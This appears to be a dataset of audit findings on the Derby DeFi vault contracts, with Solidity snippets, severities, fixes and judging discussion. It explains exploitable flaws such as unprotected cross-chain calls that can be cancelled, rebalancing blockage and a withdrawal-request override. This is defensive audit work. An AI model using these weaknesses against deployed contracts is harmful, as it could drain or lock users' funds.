User should not receive rewards for the rebalance period, when protocol was blacklisted, because of unpredicted behaviour of protocol priceчmediumч```\n  function storePriceAndRewards(uint256 _totalUnderlying, uint256 _protocolId) internal {\n    uint256 currentPrice = price(_protocolId);\n    if (lastPrices[_protocolId] == 0) {\n      lastPrices[_protocolId] = currentPrice;\n      return;\n    }\n\n\n    int256 priceDiff = int256(currentPrice - lastPrices[_protocolId]);\n    int256 nominator = (int256(_totalUnderlying * performanceFee) * priceDiff);\n    int256 totalAllocatedTokensRounded = totalAllocatedTokens / 1E18;\n    int256 denominator = totalAllocatedTokensRounded * int256(lastPrices[_protocolId]) * 100; // * 100 cause perfFee is in percentages\n\n\n    if (totalAllocatedTokensRounded == 0) {\n      rewardPerLockedToken[rebalancingPeriod][_protocolId] = 0;\n    } else {\n      rewardPerLockedToken[rebalancingPeriod][_protocolId] = nominator / denominator;\n    }\n\n\n    lastPrices[_protocolId] = currentPrice;\n  }\n```\nчUser should not receive rewards for the rebalance period, when protocol was blacklisted, because of unpredicted behaviour of protocol price.\nWhen user allocates derby tokens to some underlying protocol, he receive rewards according to the exchange price of that protocols token. This reward can be positive or negative. Rewards of protocol are set to `Game` contract inside `settleRewards` function and they are accumulated for user, once he calls `rebalanceBasket`.\n```\n  function storePriceAndRewards(uint256 _totalUnderlying, uint256 _protocolId) internal {\n    uint256 currentPrice = price(_protocolId);\n    if (lastPrices[_protocolId] == 0) {\n      lastPrices[_protocolId] = currentPrice;\n      return;\n    }\n\n\n    int256 priceDiff = int256(currentPrice - lastPrices[_protocolId]);\n    int256 nominator = (int256(_totalUnderlying * performanceFee) * priceDiff);\n    int256 totalAllocatedTokensRounded = totalAllocatedTokens / 1E18;\n    int256 denominator = totalAllocatedTokensRounded * int256(lastPrices[_protocolId]) * 100; // * 100 cause perfFee is in percentages\n\n\n    if (totalAllocatedTokensRounded == 0) {\n      rewardPerLockedToken[rebalancingPeriod][_protocolId] = 0;\n    } else {\n      rewardPerLockedToken[rebalancingPeriod][_protocolId] = nominator / denominator;\n    }\n\n\n    lastPrices[_protocolId] = currentPrice;\n  }\n```\n\nEvery time, previous price of protocol is compared with current price.\nIn case if some protocol is hacked, there is `Vault.blacklistProtocol` function, that should withdraw reserves from protocol and mark it as blacklisted. The problem is that because of the hack it's not possible to determine what will happen with exhange rate of protocol. It can be 0, ot it can be very small or it can be high for any reasons. But protocol still accrues rewards per token for protocol, even that it is blacklisted. Because of that, user that allocated to that protocol can face with accruing very big negative or positive rewards. Both this cases are bad.\nSo i believe that in case if protocol is blacklisted, it's better to set rewards as 0 for it.\nExample. 1.User allocated 100 derby tokens for protocol A 2.Before `Vault.rebalance` call, protocol A was hacked which made it exchangeRate to be not real. 3.Derby team has blacklisted that protocol A. 4.Vault.rebalance is called which used new(incorrect) exchangeRate of protocol A in order to calculate `rewardPerLockedToken` 5.When user calls rebalance basket next time, his rewards are accumulated with extremely high/low value.чIn case if protocol is blacklisted, then set `rewardPerLockedToken` to 0 inside `storePriceAndRewards` function.чUser's rewards calculation is unpredictable.\nCode Snippet\nProvided above\nTool used\nManual Review
Malicious users could set allocations to a blacklist Protocol and break the rebalancing logicчmediumч```\nvaults[_vaultNumber].deltaAllocationProtocol[_chainId][i] = 0;\n```\nч"```\nvaults[_vaultNumber].deltaAllocationProtocol[_chainId][i] = 0;\n```\n\nMalicious users could set allocations to a blacklist Protocol. If only one of the `Baskets` has a non-zero value to a Protocol on blacklist receiveProtocolAllocations() will revert `receiveProtocolAllocations().receiveProtocolAllocationsInt().setDeltaAllocationsInt()`\n```\n  function setDeltaAllocationsInt(uint256 _protocolNum, int256 _allocation) internal {\n    require(!controller.getProtocolBlacklist(vaultNumber, _protocolNum), ""Protocol on blacklist"");\n    deltaAllocations[_protocolNum] += _allocation;\n    deltaAllocatedTokens += _allocation;\n  }\n```\n\nand You won't be able to execute rebalance()"ч
Wrong calculation of `balanceBefore` and `balanceAfter` in deposit methodчmediumч```\n    uint256 balanceBefore = getVaultBalance() - reservedFunds;\n    vaultCurrency.safeTransferFrom(msg.sender, address(this), _amount);\n    uint256 balanceAfter = getVaultBalance() - reservedFunds;\n    uint256 amount = balanceAfter - balanceBefore;\n```\nчDeposit method calculate net amount transferred from user. It use `reservedFunds` also in consideration when calculating `balanceBefore` and `balanceAfter` but it is not actually require.\n```\n    uint256 balanceBefore = getVaultBalance() - reservedFunds;\n    vaultCurrency.safeTransferFrom(msg.sender, address(this), _amount);\n    uint256 balanceAfter = getVaultBalance() - reservedFunds;\n    uint256 amount = balanceAfter - balanceBefore;\n```\n\nDeposit may fail when `reservedFunds` is greater than `getVaultBalance()`ч
Vault could `rebalance()` before funds arrive from xChainControllerчmediumч```\n       // rest of code\n      pushFeedbackToVault(_chainId, _vault, _relayerFee);\n      xTransfer(_asset, _amount, _vault, _chainId, _slippage, _relayerFee);\n       // rest of code\n```\nч"Invoke sendFundsToVault() to Push funds from xChainController to vaults. which is call xTransferToVaults()\nFor the cross-chain rebalancing `xTransferToVaults()` will execute this logic\n```\n       // rest of code\n      pushFeedbackToVault(_chainId, _vault, _relayerFee);\n      xTransfer(_asset, _amount, _vault, _chainId, _slippage, _relayerFee);\n       // rest of code\n```\n\n`pushFeedbackToVault()` Is to invoke receiveFunds() `pushFeedbackToVault()` always travel through the slow path\n`xTransfer()` to transfer funds from one chain to another If fast liquidity is not available, the `xTransfer()` will go through the slow path.\nThe vulnerability is if the `xcall()` of `pushFeedbackToVault()` excited successfully before `xTransfer()` transfer the funds to the vault, anyone can invoke rebalance() this will lead to rebalancing Vaults with Imperfect funds (this could be true only if funds that are expected to be received from XChainController are greater than `reservedFunds` and `liquidityPerc` together )\nThe above scenario could be done in two possible cases 1- `xTransfer()` will go through the slow path but because High Slippage the cross-chain message will wait until slippage conditions improve (relayers will continuously re-attempt the transfer execution).\n2- Connext Team says\n```\nAll messages are added to a Merkle root which is sent across chains every 30 mins\nAnd then those messages are executed by off-chain actors called routers\n\nso it is indeed possible that messages are received out of order (and potentially with increased latency in between due to batch times) \nFor ""fast path"" (unauthenticated) messages, latency is not a concern, but ordering may still be (this is an artifact of the chain itself too btw)\none thing you can do is add a nonce to your messages so that you can yourself order them at destination\n```\n\nso `pushFeedbackToVault()` and `xTransfer()` could be added to a different Merkle root and this will lead to executing `receiveFunds()` before funds arrive."чCheck if funds are arrived or notчThe vault could `rebalance()` before funds arrive from xChainController, this will reduce rewards\nCode Snippet\nTool used\nManual Review
Protocol is will not work on most of the supported blockchains due to hardcoded WETH contract address.чmediumч```\naddress internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n```\nчThe WETH address is hardcoded in the `Swap` library.\n```\naddress internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n```\nчThe WETH variable should be immutable in the Vault contract instead of a constant in the Swap library and the Wrapped Native Token contract address should be passed in the Vault constructor on each separate deployment.чProtocol will not work on most of the supported blockchains.\nCode Snippet\n```\naddress internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n```\n\nTool used\nManual Review
Rebalancing can be indefinitely blocked due to ever-increasing `totalWithdrawalRequests`, causing locking of funds in vaultsчmediumч```\nfunction resetVaultUnderlying(uint256 _vaultNumber) internal {\n  vaults[_vaultNumber].totalUnderlying = 0;\n  vaultStage[_vaultNumber].underlyingReceived = 0;\n  vaults[_vaultNumber].totalSupply = 0;\n}\n```\nчRebalancing can get stuck indefinitely at the `pushVaultAmounts` step due to an error in the accounting of `totalWithdrawalRequests`. As a result, funds will be locked in vaults since requested withdrawals are only executed after a next successful rebalance.\nFunds deposited to underlying protocols can only be withdrawn from vaults after a next successful rebalance:\na depositor has to make a withdrawal request first, which is tracked in the current rebalance period;\nrequested funds can be withdrawn in the next rebalance period.\nThus, it's critical that rebalancing doesn't get stuck during one of its stages.\nDuring rebalancing, vaults report their balances to `XChainController` via the pushTotalUnderlyingToController function: the functions sends the current unlocked (i.e. excluding reserved funds) underlying token balance of the vault and the total amount of withdrawn requests in the current period. The latter amount is stored in the `totalWithdrawalRequests` storage variable:\nthe variable is increased when a new withdrawal request is made;\nand it's set to 0 after the vault has been rebalanced–it's value is added to the reserved funds.\nThe logic of `totalWithdrawalRequests` is that it tracks only the requested withdrawal amounts in the current period–this amount becomes reserved during rebalancing and is added to `reservedFunds` after the vault has been rebalanced.\nWhen `XChainController` receives underlying balances and withdrawal requests from vaults, it tracks them internally. The amounts then used to calculate how much tokens a vault needs to send or receive after a rebalancing: the total withdrawal amount is subtracted from vault's underlying balance so that it's excluded from the amounts that will be sent to the protocols and so that it could then be added to the reserved funds of the vault.\nHowever, `totalWithdrawalRequests` in `XChainController` is not reset between rebalancings: when a new rebalancing starts, `XChainController` receives allocations from the Game and calls `resetVaultUnderlying`, which resets the underlying balances receive from vaults in the previous rebalancing. `resetVaultUnderlying` doesn't set `totalWithdrawalRequests` to 0:\n```\nfunction resetVaultUnderlying(uint256 _vaultNumber) internal {\n  vaults[_vaultNumber].totalUnderlying = 0;\n  vaultStage[_vaultNumber].underlyingReceived = 0;\n  vaults[_vaultNumber].totalSupply = 0;\n}\n```\n\nThis cause the value of `totalWithdrawalRequests` to accumulate over time. At some point, the total historical amount of all withdrawal requests (which `totalWithdrawalRequests` actually tracks) will be greater than the underlying balance of a vault, and this line will revert due to an underflow in the subtraction:\n```\nuint256 totalUnderlying = getTotalUnderlyingVault(_vaultNumber) - totalWithdrawalRequests;\n```\nчIn `XChainController.resetVaultUnderlying`, consider setting `vaults[_vaultNumber].totalWithdrawalRequests` to 0. `totalWithdrawalRequests`, like its `MainVault.totalWithdrawalRequests` counterpart, tracks withdrawal requests only in the current period and should be reset to 0 between rebalancings.\nDiscussion\nsjoerdsommen\ntotalWithdrawalRequests in the xChainController is never reset.\nsjoerdsommen\nduplicate with #239\nDiscussion\nsjoerdsommen\ntotalWithdrawalRequests in the xChainController is never reset.\nsjoerdsommen\nduplicate with #239чDue to accumulation of withdrawal request amounts in the `totalWithdrawalRequests` variable, `XChainController.pushVaultAmounts` can be blocked indefinitely after the value of `totalWithdrawalRequests` has grown bigger than the value of `totalUnderlying` of a vault. Since withdrawals from vaults are delayed and enable in a next rebalancing period, depositors may not be able to withdraw their funds from vaults, due to a block rebalancing.\nWhile `XChainController` implements a bunch of functions restricted to the guardian that allow the guardian to push a rebalancing through, neither of these functions resets the value of `totalWithdrawalRequests`. If `totalWithdrawalRequests` becomes bigger than `totalUnderlying`, the guardian won't be able to fix the state of `XChainController` and push the rebalancing through.\nCode Snippet\nTool used\nManual Review
Wrong type casting leads to unsigned integer underflow exception when current price is < last priceчmediumч```\nint256 priceDiff = int256(currentPrice - lastPrices[_protocolId]);\n```\nчWhen the current price of a locked token is lower than the last price, the Vault.storePriceAndRewards will revert because of the wrong integer casting.\nThe following line appears in Vault.storePriceAndRewards:\n```\nint256 priceDiff = int256(currentPrice - lastPrices[_protocolId]);\n```\n\nIf lastPrices[_protocolId] is higher than the currentPrice, the solidity compiler will revert due the underflow of subtracting unsigned integers because it will first try to calculate the result of `currentPrice - lastPrices[_protocolId]` and then try to cast it to int256.ч"
withdrawal request overrideчmediumч"```\n  function withdrawalRequest(\n    uint256 _amount\n  ) external nonReentrant onlyWhenVaultIsOn returns (uint256 value) {\n    UserInfo storage user = userInfo[msg.sender];\n    require(user.withdrawalRequestPeriod == 0, ""Already a request"");\n\n    value = (_amount * exchangeRate) / (10 ** decimals());\n\n    _burn(msg.sender, _amount);\n\n    user.withdrawalAllowance = value;\n    user.withdrawalRequestPeriod = rebalancingPeriod;\n    totalWithdrawalRequests += value;\n  }\n```\n"ч"It is possible that a withdrawal request is overridden during the initial phase.\nUsers have two options to withdraw: directly or request a withdrawal if not enough funds are available at the moment.\nWhen making a `withdrawalRequest` it is required that the user has `withdrawalRequestPeriod` not set:\n```\n  function withdrawalRequest(\n    uint256 _amount\n  ) external nonReentrant onlyWhenVaultIsOn returns (uint256 value) {\n    UserInfo storage user = userInfo[msg.sender];\n    require(user.withdrawalRequestPeriod == 0, ""Already a request"");\n\n    value = (_amount * exchangeRate) / (10 ** decimals());\n\n    _burn(msg.sender, _amount);\n\n    user.withdrawalAllowance = value;\n    user.withdrawalRequestPeriod = rebalancingPeriod;\n    totalWithdrawalRequests += value;\n  }\n```\n\nThis will misbehave during the initial period when `rebalancingPeriod` is 0. The check will pass, so if invoked multiple times, it will burn users' shares and overwrite the value."ч
Anyone can execute certain functions that use cross chain messages and potentially cancel them with potential loss of funds.чhighч```\n    uint256 relayerFee = _relayerFee != 0 ? _relayerFee : msg.value;\n    IConnext(connext).xcall{value: relayerFee}(\n      _destinationDomain, // _destination: Domain ID of the destination chain\n      target, // _to: address of the target contract\n      address(0), // _asset: use address zero for 0-value transfers\n      msg.sender, // _delegate: address that can revert or forceLocal on destination\n      0, // _amount: 0 because no funds are being transferred\n      0, // _slippage: can be anything between 0-10000 because no funds are being transferred\n      _callData // _callData: the encoded calldata to send\n    );\n  }\n```\nч"Certain functions that route messages cross chain on the `Game` and `MainVault` contract are unprotected (anyone can call them under the required state of the vaults). The way the cross chain messaging is implemented in the XProvider makes use of Connext's `xcall()` and sets the `msg.sender` as the `delegate` and `msg.value` as `relayerFee`. There are two possible attack vectors with this:\nEither an attacker can call the function and set the msg.value to low so it won't be relayed until someone bumps the fee (Connext allows anyone to bump the fee). This however means special action must be taken to bump the fee in such a case.\nOr the attacker can call the function (which irreversibly changes the state of the contract) and as the delegate of the `xcall` cancel the message. This functionality is however not yet active on Connext, but the moment it is the attacker will be able to change the state of the contract on the origin chain and make the cross chain message not execute on the destination chain leaving the contracts on the two chains out of synch with possible loss of funds as a result.\nThe `XProvider` contract's `xsend()` function sets the `msg.sender` as the delegate and `msg.value` as `relayerFee`\n```\n    uint256 relayerFee = _relayerFee != 0 ? _relayerFee : msg.value;\n    IConnext(connext).xcall{value: relayerFee}(\n      _destinationDomain, // _destination: Domain ID of the destination chain\n      target, // _to: address of the target contract\n      address(0), // _asset: use address zero for 0-value transfers\n      msg.sender, // _delegate: address that can revert or forceLocal on destination\n      0, // _amount: 0 because no funds are being transferred\n      0, // _slippage: can be anything between 0-10000 because no funds are being transferred\n      _callData // _callData: the encoded calldata to send\n    );\n  }\n```\n\n`xTransfer()` using `msg.sender` as delegate:\n```\n    IConnext(connext).xcall{value: (msg.value - _relayerFee)}(\n      _destinationDomain, // _destination: Domain ID of the destination chain\n      _recipient, // _to: address receiving the funds on the destination\n      _token, // _asset: address of the token contract\n      msg.sender, // _delegate: address that can revert or forceLocal on destination\n      _amount, // _amount: amount of tokens to transfer\n      _slippage, // _slippage: the maximum amount of slippage the user will accept in BPS (e.g. 30 = 0.3%)\n      bytes("""") // _callData: empty bytes because we're only sending funds\n    );\n  }\n```\n\nConnext documentation explaining:\n```\nparams.delegate | (optional) Address allowed to cancel an xcall on destination.\n```\n\nConnext documentation seems to indicate this functionality isn't active yet though it isn't clear whether that applies to the cancel itself or only the bridging back the funds to the origin chain."ч
Wrong type casting leads to unsigned integer underflow exception when current price is < last priceчhighч```\nint256 priceDiff = int256(currentPrice - lastPrices[_protocolId]);\n```\nчWhen the current price of a locked token is lower than the last price, the Vault.storePriceAndRewards will revert because of the wrong integer casting.\nThe following line appears in Vault.storePriceAndRewards:\n```\nint256 priceDiff = int256(currentPrice - lastPrices[_protocolId]);\n```\n\nIf lastPrices[_protocolId] is higher than the currentPrice, the solidity compiler will revert due the underflow of subtracting unsigned integers because it will first try to calculate the result of `currentPrice - lastPrices[_protocolId]` and then try to cast it to int256.ч"
Not all providers claim the rewardsчhighч```\n  function claim(address _aToken, address _claimer) public override returns (bool) {}\n```\nчProviders wrongly assume that the protocols will no longer incentivize users with extra rewards.\nAmong the current providers only the `CompoundProvider` claims the `COMP` incentives, others leave the claim function empty:\n```\n  function claim(address _aToken, address _claimer) public override returns (bool) {}\n```\n\nWhile many of the protocols currently do not offer extra incentives, it is not safe to assume it will not resume in the future, e.g. when bulls return to the town. For example, `Aave` supports multi rewards claim: https://docs.aave.com/developers/whats-new/multiple-rewards-and-claim When it was deployed on Optimism, it offered extra OP rewards for a limited time. There is no guarantee, but a similar thing might happen in the future with new chains and technology.\nWhile `Beta` currently does not have active rewards distribution but based on the schedule, it is likely to resume in the future: https://betafinance.gitbook.io/betafinance/beta-tokenomics#beta-token-distribution-scheduleчAdjust the providers to be ready to claim the rewards if necessary.\nDiscussion\nsjoerdsommen\nWhile true, we can easily replace the providers when new functionality for claiming tokens becomes available.\npauliax\nEscalate for 10 USDC.\nWhile new providers can be added, old providers cannot be updated to accept these rewards, so users who were using old providers will get nothing and will be forced to migrate. Besides, deposits are not instantaneous, it takes time to rebalance them. Also, not all rewards are liquidity mining, some are snapshot-based. Let's say an external entity decides to airdrop all the Aave lenders. Currently, there is no way to claim it and distribute it among real users. This will incur lost rewards for the end users, thus I believe it is a valid concern.\nsherlock-admin\nEscalate for 10 USDC.\nWhile new providers can be added, old providers cannot be updated to accept these rewards, so users who were using old providers will get nothing and will be forced to migrate. Besides, deposits are not instantaneous, it takes time to rebalance them. Also, not all rewards are liquidity mining, some are snapshot-based. Let's say an external entity decides to airdrop all the Aave lenders. Currently, there is no way to claim it and distribute it among real users. This will incur lost rewards for the end users, thus I believe it is a valid concern.\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nhrishibhat\nEscalation accepted\nGiven that there are no implementations for claims in some of the providers considering these a valid high.\nsherlock-admin\nEscalation accepted\nGiven that there are no implementations for claims in some of the providers considering these a valid high.\nThis issue's escalations have been accepted!\nContestants' payouts and scores will be updated according to the changes made on this issue.чThe implementations of the providers are based on the current situation. They are not flexible enough to support the rewards in case the incentives are back.\nCode Snippet\nTool used\nManual Review
withdrawal request overrideчmediumч"```\n  function withdrawalRequest(\n    uint256 _amount\n  ) external nonReentrant onlyWhenVaultIsOn returns (uint256 value) {\n    UserInfo storage user = userInfo[msg.sender];\n    require(user.withdrawalRequestPeriod == 0, ""Already a request"");\n\n    value = (_amount * exchangeRate) / (10 ** decimals());\n\n    _burn(msg.sender, _amount);\n\n    user.withdrawalAllowance = value;\n    user.withdrawalRequestPeriod = rebalancingPeriod;\n    totalWithdrawalRequests += value;\n  }\n```\n"ч"It is possible that a withdrawal request is overridden during the initial phase.\nUsers have two options to withdraw: directly or request a withdrawal if not enough funds are available at the moment.\nWhen making a `withdrawalRequest` it is required that the user has `withdrawalRequestPeriod` not set:\n```\n  function withdrawalRequest(\n    uint256 _amount\n  ) external nonReentrant onlyWhenVaultIsOn returns (uint256 value) {\n    UserInfo storage user = userInfo[msg.sender];\n    require(user.withdrawalRequestPeriod == 0, ""Already a request"");\n\n    value = (_amount * exchangeRate) / (10 ** decimals());\n\n    _burn(msg.sender, _amount);\n\n    user.withdrawalAllowance = value;\n    user.withdrawalRequestPeriod = rebalancingPeriod;\n    totalWithdrawalRequests += value;\n  }\n```\n\nThis will misbehave during the initial period when `rebalancingPeriod` is 0. The check will pass, so if invoked multiple times, it will burn users' shares and overwrite the value."ч
An inactive vault can disrupt rebalancing of active vaultsчmediumч"```\nmodifier onlyWhenUnderlyingsReceived(uint256 _vaultNumber) {\n  require(\n    vaultStage[_vaultNumber].underlyingReceived == vaultStage[_vaultNumber].activeVaults,\n    ""Not all underlyings received""\n  );\n  _;\n}\n```\n"ч"An inactive vault can send its total underlying amount to the `XChainController` and disrupt rebalancing of active vaults by increasing the `underlyingReceived` counter:\nif `pushVaultAmounts` is called before `underlyingReceived` overflows, rebalancing of one of the active vault may get stuck since the vault won't receive XChain allocations;\nif `pushVaultAmounts` after all active vaults and at least one inactive vault has reported their underlying amounts, rebalancing of all vaults will get stuck.\nRebalancing of vaults starts when Game.pushAllocationsToController is called. The function sends the allocations made by gamers to the `XChainController`. `XChainController` receives them in the receiveAllocationsFromGame function. In the settleCurrentAllocation function, a vault is marked as inactive if it has no allocations and there are no new allocations for the vault. `receiveAllocationsFromGameInt` remembers the number of active vaults.\nThe next step of the rebalancing process is reporting vault underlying token balances to the `XChainController` by calling MainVault.pushTotalUnderlyingToController. As you can see, the function can be called in an inactive vault (the only modifier of the function, `onlyWhenIdle`, doesn't check that `vaultOff` is false). `XChainController` receives underlying balances in the setTotalUnderlying function: notice that the function increases the number of balances it has received.\nNext step is the XChainController.pushVaultAmounts function, which calculates how much tokens each vault should receive after gamers have changed their allocations. The function can be called only when all active vaults have reported their underlying balances:\n```\nmodifier onlyWhenUnderlyingsReceived(uint256 _vaultNumber) {\n  require(\n    vaultStage[_vaultNumber].underlyingReceived == vaultStage[_vaultNumber].activeVaults,\n    ""Not all underlyings received""\n  );\n  _;\n}\n```\n\nHowever, as we saw above, inactive vaults can also report their underlying balances and increase the `underlyingReceived` counter–if this is abused mistakenly or intentionally (e.g. by a malicious actor), vaults may end up in a corrupted state. Since all the functions involved in rebalancing are not restricted (including `pushTotalUnderlyingToController` and pushVaultAmounts), a malicious actor can intentionally disrupt accounting of vaults or block a rebalancing."ч
Rebalancing can be indefinitely blocked due to ever-increasing `totalWithdrawalRequests`, causing locking of funds in vaultsчmediumч```\nfunction resetVaultUnderlying(uint256 _vaultNumber) internal {\n  vaults[_vaultNumber].totalUnderlying = 0;\n  vaultStage[_vaultNumber].underlyingReceived = 0;\n  vaults[_vaultNumber].totalSupply = 0;\n}\n```\nчRebalancing can get stuck indefinitely at the `pushVaultAmounts` step due to an error in the accounting of `totalWithdrawalRequests`. As a result, funds will be locked in vaults since requested withdrawals are only executed after a next successful rebalance.\nFunds deposited to underlying protocols can only be withdrawn from vaults after a next successful rebalance:\na depositor has to make a withdrawal request first, which is tracked in the current rebalance period;\nrequested funds can be withdrawn in the next rebalance period.\nThus, it's critical that rebalancing doesn't get stuck during one of its stages.\nDuring rebalancing, vaults report their balances to `XChainController` via the pushTotalUnderlyingToController function: the functions sends the current unlocked (i.e. excluding reserved funds) underlying token balance of the vault and the total amount of withdrawn requests in the current period. The latter amount is stored in the `totalWithdrawalRequests` storage variable:\nthe variable is increased when a new withdrawal request is made;\nand it's set to 0 after the vault has been rebalanced–it's value is added to the reserved funds.\nThe logic of `totalWithdrawalRequests` is that it tracks only the requested withdrawal amounts in the current period–this amount becomes reserved during rebalancing and is added to `reservedFunds` after the vault has been rebalanced.\nWhen `XChainController` receives underlying balances and withdrawal requests from vaults, it tracks them internally. The amounts then used to calculate how much tokens a vault needs to send or receive after a rebalancing: the total withdrawal amount is subtracted from vault's underlying balance so that it's excluded from the amounts that will be sent to the protocols and so that it could then be added to the reserved funds of the vault.\nHowever, `totalWithdrawalRequests` in `XChainController` is not reset between rebalancings: when a new rebalancing starts, `XChainController` receives allocations from the Game and calls `resetVaultUnderlying`, which resets the underlying balances receive from vaults in the previous rebalancing. `resetVaultUnderlying` doesn't set `totalWithdrawalRequests` to 0:\n```\nfunction resetVaultUnderlying(uint256 _vaultNumber) internal {\n  vaults[_vaultNumber].totalUnderlying = 0;\n  vaultStage[_vaultNumber].underlyingReceived = 0;\n  vaults[_vaultNumber].totalSupply = 0;\n}\n```\n\nThis cause the value of `totalWithdrawalRequests` to accumulate over time. At some point, the total historical amount of all withdrawal requests (which `totalWithdrawalRequests` actually tracks) will be greater than the underlying balance of a vault, and this line will revert due to an underflow in the subtraction:\n```\nuint256 totalUnderlying = getTotalUnderlyingVault(_vaultNumber) - totalWithdrawalRequests;\n```\nч
Vault could `rebalance()` before funds arrive from xChainControllerчmediumч```\n       // rest of code\n      pushFeedbackToVault(_chainId, _vault, _relayerFee);\n      xTransfer(_asset, _amount, _vault, _chainId, _slippage, _relayerFee);\n       // rest of code\n```\nч"Invoke sendFundsToVault() to Push funds from xChainController to vaults. which is call xTransferToVaults()\nFor the cross-chain rebalancing `xTransferToVaults()` will execute this logic\n```\n       // rest of code\n      pushFeedbackToVault(_chainId, _vault, _relayerFee);\n      xTransfer(_asset, _amount, _vault, _chainId, _slippage, _relayerFee);\n       // rest of code\n```\n\n`pushFeedbackToVault()` Is to invoke receiveFunds() `pushFeedbackToVault()` always travel through the slow path\n`xTransfer()` to transfer funds from one chain to another If fast liquidity is not available, the `xTransfer()` will go through the slow path.\nThe vulnerability is if the `xcall()` of `pushFeedbackToVault()` excited successfully before `xTransfer()` transfer the funds to the vault, anyone can invoke rebalance() this will lead to rebalancing Vaults with Imperfect funds (this could be true only if funds that are expected to be received from XChainController are greater than `reservedFunds` and `liquidityPerc` together )\nThe above scenario could be done in two possible cases 1- `xTransfer()` will go through the slow path but because High Slippage the cross-chain message will wait until slippage conditions improve (relayers will continuously re-attempt the transfer execution).\n2- Connext Team says\n```\nAll messages are added to a Merkle root which is sent across chains every 30 mins\nAnd then those messages are executed by off-chain actors called routers\n\nso it is indeed possible that messages are received out of order (and potentially with increased latency in between due to batch times) \nFor ""fast path"" (unauthenticated) messages, latency is not a concern, but ordering may still be (this is an artifact of the chain itself too btw)\none thing you can do is add a nonce to your messages so that you can yourself order them at destination\n```\n\nso `pushFeedbackToVault()` and `xTransfer()` could be added to a different Merkle root and this will lead to executing `receiveFunds()` before funds arrive."чCheck if funds are arrived or notчThe vault could `rebalance()` before funds arrive from xChainController, this will reduce rewards\nCode Snippet\nTool used\nManual Review
Wrong calculation of `balanceBefore` and `balanceAfter` in deposit methodчmediumч```\n    uint256 balanceBefore = getVaultBalance() - reservedFunds;\n    vaultCurrency.safeTransferFrom(msg.sender, address(this), _amount);\n    uint256 balanceAfter = getVaultBalance() - reservedFunds;\n    uint256 amount = balanceAfter - balanceBefore;\n```\nчDeposit method calculate net amount transferred from user. It use `reservedFunds` also in consideration when calculating `balanceBefore` and `balanceAfter` but it is not actually require.\n```\n    uint256 balanceBefore = getVaultBalance() - reservedFunds;\n    vaultCurrency.safeTransferFrom(msg.sender, address(this), _amount);\n    uint256 balanceAfter = getVaultBalance() - reservedFunds;\n    uint256 amount = balanceAfter - balanceBefore;\n```\n\nDeposit may fail when `reservedFunds` is greater than `getVaultBalance()`чUse below code. This is correct way of finding net amount transfer by depositor\n```\n    uint256 balanceBefore = getVaultBalance();\n    vaultCurrency.safeTransferFrom(msg.sender, address(this), _amount);\n    uint256 balanceAfter = getVaultBalance();\n    uint256 amount = balanceAfter - balanceBefore;\n```\n\nDiscussion\nsjoerdsommen\nduplicate with #262 #66 #45чDeposit may fail when `reservedFunds` is greater than `getVaultBalance()`\nCode Snippet\n```\n    uint256 balanceBefore = getVaultBalance() - reservedFunds;\n    vaultCurrency.safeTransferFrom(msg.sender, address(this), _amount);\n    uint256 balanceAfter = getVaultBalance() - reservedFunds;\n    uint256 amount = balanceAfter - balanceBefore;\n```\n\nTool used\nManual Review
Malicious users could set allocations to a blacklist Protocol and break the rebalancing logicчmediumч```\nvaults[_vaultNumber].deltaAllocationProtocol[_chainId][i] = 0;\n```\nч"```\nvaults[_vaultNumber].deltaAllocationProtocol[_chainId][i] = 0;\n```\n\nMalicious users could set allocations to a blacklist Protocol. If only one of the `Baskets` has a non-zero value to a Protocol on blacklist receiveProtocolAllocations() will revert `receiveProtocolAllocations().receiveProtocolAllocationsInt().setDeltaAllocationsInt()`\n```\n  function setDeltaAllocationsInt(uint256 _protocolNum, int256 _allocation) internal {\n    require(!controller.getProtocolBlacklist(vaultNumber, _protocolNum), ""Protocol on blacklist"");\n    deltaAllocations[_protocolNum] += _allocation;\n    deltaAllocatedTokens += _allocation;\n  }\n```\n\nand You won't be able to execute rebalance()"ч
Asking for `balanceOf()` in the wrong addressчmediumч```\naddress underlying = getUnderlyingAddress(_vaultNumber, _chain);\nuint256 balance = IERC20(underlying).balanceOf(address(this));\n```\nчon sendFundsToVault() this logic\n```\naddress underlying = getUnderlyingAddress(_vaultNumber, _chain);\nuint256 balance = IERC20(underlying).balanceOf(address(this));\n```\n\nin case `_chainId` is Optimism the `underlying` address is for Optimism (L2) but `XChainController` is on Mainnet you can't invoke `balanceOf()` like this!!!ч`getUnderlyingAddress(_vaultNumber, _chain);` should just be `getUnderlyingAddress(_vaultNumber);` so the `underlying` here\n```\nuint256 balance = IERC20(underlying).balanceOf(address(this));\n```\n\nwill be always on the Mainnet\nDiscussion\nCh-301\nEscalate for 10 USDC\nThis one was confirmed by the Sponsor check the discussion for more details\nsherlock-admin\nEscalate for 10 USDC\nThis one was confirmed by the Sponsor check the discussion for more details\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nTheezr\nValid medium issue\nhrishibhat\nEscalation accepted\nConsidering this issue a valid medium\nsherlock-admin\nEscalation accepted\nConsidering this issue a valid medium\nThis issue's escalations have been accepted!\nContestants' payouts and scores will be updated according to the changes made on this issue.чAsking for `balanceOf()` in the wrong address The protocol will be not able to rebalance the vault\nCode Snippet\nTool used\nManual Review
